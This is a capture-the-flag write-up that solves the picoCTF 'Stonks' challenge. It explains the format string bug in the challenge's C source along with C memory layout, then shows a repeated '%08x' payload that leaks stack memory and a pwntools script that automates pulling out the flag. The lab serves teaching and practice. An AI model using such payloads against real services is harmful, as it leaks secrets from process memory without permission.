> AUTHOR: MADSTACKS
>
> #### Description
>
> I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!
>
> ```bash
>  nc mercury.picoctf.net 27912
> ```



# Footprinting

The provided connection executes the *C* source code displayed on `vuln.c`. The start menu expects one of the two available options as user input.

```c
// vuln.c
<SNIP>
printf("Welcome back to the trading app!\n\n");
printf("What would you like to do?\n");
printf("1) Buy some stonks!\n");
printf("2) View my portfolio\n");
scanf("%d", &resp);

if (resp == 1) {
    buy_stonks(p);
} else if (resp == 2) {
    view_portfolio(p);
}
<SNIP>
```

The `View my portfolio` option is rather simple and uninteresting. The `Buy some stonks` is much more interesting.

```c
// vuln.c
<SNIP>
Stonk *pick_symbol_with_AI(int shares) {
	<SNIP>
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);			// [1]
	<SNIP>
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		<SNIP>
	}
	printf("Stonks chosen\n");
	<SNIP>
	char *user_buf = malloc(300 + 1);		// [2]
	printf("What is your API token?\n");
	scanf("%300s", user_buf);				// [3]
	printf("Buying stonks with token:\n");
	printf(user_buf);						// [4]
	<SNIP>
	view_portfolio(p);

	return 0;
}
<SNIP>
```

**Code execution logic:**

1. The service opens a file pointer and retrieves the content of `api`. The content of size `FLAG_BUFFER` is stored inside the `char` pointer `api_buf`.
2. The service dynamically allocates a total of 300 bytes of uninitialized heap storage for content (plus the null byte). If the memory allocation succeeds, the  `malloc` function returns a pointer to the beginning of the newly allocated memory.
3. The service will expect a user input from `stdin` of type string.
4. Code statement vulnerable to a **format string attack**.



# *C* Programs

## Compilation process

A *C* codebase passes through several phases before being converted into object code by a compiler:

1. **Preprocessor**

   In this phase, the source code is stripped of any comments and expanded. Arguably the two most used expansion features of a preprocessor is file content inclusion with `#include`, and token replacement of an arbitrary sequence of characters with `#define`. Other feature include conditional compilation, or macros with arguments.

2.  **Compiler**

   In this phase, the pre-processed code is converted into assembly code.

3. **Assembler**

   In this phase, the generated assembly code is converted into object code. The name of the object file generated by the assembler is the same as the source file, with the extension `.obj` in *DOS* and `.o` in *UNIX*.

4. **Linker**

   In this phase, the compiler combines the pre-compiled object code of the library functions with the object code of our program. When our program refers to the functions defined in other files, its the job of the linker to link the object code of our program with the object code of the library files and other files. The output of the linker is the executable file.



## Virtual memory layout

The generated object file generated by the assembler contains machine code (in *Java* is *bytecode*) known as object code. Other data and metadata are also included by the compiler/assembler.

![File:Program memory layout.pdf](https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Program_memory_layout.pdf/page1-234px-Program_memory_layout.pdf.jpg)

- **Text/Code Segment**

  The lower addresses of the virtual address space are dedicated to the executable instructions. The information loaded in memory is typically read-only and has a fixed size.  

- **Initialized Data Segment**

  Portion of the virtual address space of a program, which contain the initialized global and `static` variables.

- **Uninitialized Data Segment**

  Also called *Block Starting by Symbol*, is the portion of the virtual address space of a program that contains statically allocated variables (allocated at compile time) that are declared but have not been assigned a value yet. Typically only the <u>length</u> of the *.bss* section is stored in the object file. The program loader is then responsible to allocating memory for the *.bss* section when it loads the program - this ensures that the size of the object file is reduced. In *Unix-like* and *Windows* initialize the *.bss* section to zero.

- **Heap Segment**

  Portion of the virtual address space of a program that contains dynamic allocated data (allocated at runtime/during execution). The heap begin at the end of the *.bss* segment and grows to larger addresses. Although not specified by the *C* standard, memory allocation in the heap portion is associated with the `malloc`, `realloc` and `free` statements (the standard specifies that `malloc` will request space from the operating system as needed - the heap is only one type of data structure which facilitates the provision of such storage duration).

- **Stack Segment**

  Portion traditionally adjoined the heap portion area and grows in the opposite direction - from larger to smaller addresses. The stack area contains the program stack, a *LIFO* structure, and is handled by a *stack pointer register* to track the top of the stack - when the stack pointer mets the heap pointer, free memory is exhausted. In this memory portion, the program stores the value of local variables, along with information each time a function is called (stack frame).



## Format string attack

[OWASP Format String description:](https://owasp.org/www-community/attacks/Format_string_attack)

> The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.



Formatted Output - [`printf`](https://cplusplus.com/reference/cstdio/printf/)

> Writes the C string pointed by *format* to the standard output ([stdout](https://cplusplus.com/stdout)). If *format* includes *format specifiers* (subsequences beginning with `%`), the additional arguments following *format* are formatted and inserted in the resulting string replacing their respective specifiers.



> The output function `printf` translates internal values to characters. It returns the number of characters printed.
>
> ```c
> int printf(char *format, arg1, arg2, ...)
> ```
>
> The format string contains two types of objects:
>
> - Ordinary characters, which are copied to the output stream.
> - Conversion specifications, each of which causes conversion and printing of the next successive argument to `printf`. Each conversion specification begins with a `%` and ends with a conversion character. Between the `%` and the conversion character there may be further formatting details.



# Solution

The source code provided is vulnerable to format string attacks and we can use this vulnerability to leak the program stack content to retrieve the value of `api_buf`. The buffer `user_buf` is dynamically allocated, which means that it is located at lower addresses than the `api_buf` variable. 

When `printf` is called, the program resolves the arguments passed and places them (in order) before the return address of the `printf` function. A simple introduction to *x86* calling convention can be found here: https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html

Since no arguments are passed besides the format string, the injection of conversion specifications will print the next addresses up on the stack. 

```bash
$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p   
Buying stonks with token:
0xa017370
<SNIP>
```



## Manual

```bash
$ nc mercury.picoctf.net 27912
<SNIP>
What is your API token?
0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x0x%08x
Buying stonks with token:
0x09e493700x0804b0000x080489c30xf7f4dd800xffffffff0x000000010x09e471600xf7f5b1100xf7f4ddc70x000000000x09e481800x000000010x09e493500x09e493700x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x326663310x306131300xffef007d0xf7f88af80xf7f5b4400x1c29c1000x000000010x000000000xf7deace90xf7f5c0c00xf7f4d5c00xf7f4d0000xffef5e880xf7ddb68d0xf7f4d5c00x08048eca0xffef5e940x000000000xf7f6ff090x0804b0000xf7f4d0000xf7f4de200xffef5ec80xf7f75d500xf7f4e8900x1c29c1000xf7f4d0000x0804b0000xffef5ec8
<SNIP>
```

The stack content can be leaked by supplying a large number of `0x%08x` conversion specifications. 

To read the flag, the following recipe on *CyberChef* can be applied over the stack content output:

```json
[
  { "op": "Swap endianness",
    "args": ["Hex", 4, true] },
  { "op": "From Hex",
    "args": ["Auto"] }
]
```



## Script

The same process above can be automated via a *Python* script using the `pwn` library.

```python
import pwn                                                                                      
                                                                                                 
conn = pwn.remote(self.__args.RHOST, self.__args.PORT)                                          
conn.recvuntil(b'View my portfolio')                                                            
conn.send(b'1\n')                                                                               
conn.recvuntil(b'What is your API token?')                                                      
conn.send(b'0x%08x' * 50 + b'\n')                                                               
conn.recvuntil(b'Buying stonks with token:\n')                                                  
stack_data = conn.recvline()                                                                    
                                                                                                
""" swap endiann and decode to ASCII"""                                                         
flag = ""                                                                                       
for x86_data in stack_data.decode("utf-8").split("0x")[1:]:                                     
  for i in range(-1, -8, -2):                                                                   
    stack_data_swap_endian = ""                                                                 
    stack_data_swap_endian += x86_data[i-1]                                                     
    stack_data_swap_endian += x86_data[i]                                                       
    _ascii = int(stack_data_swap_endian, 16)                                                    
    if (_ascii > 32) and (_ascii < 127):                                                        
      flag += chr(_ascii)                                                                       
                                                                                                 
print(flag[flag.find("picoCTF{"):flag.find("}")+1]) 
```

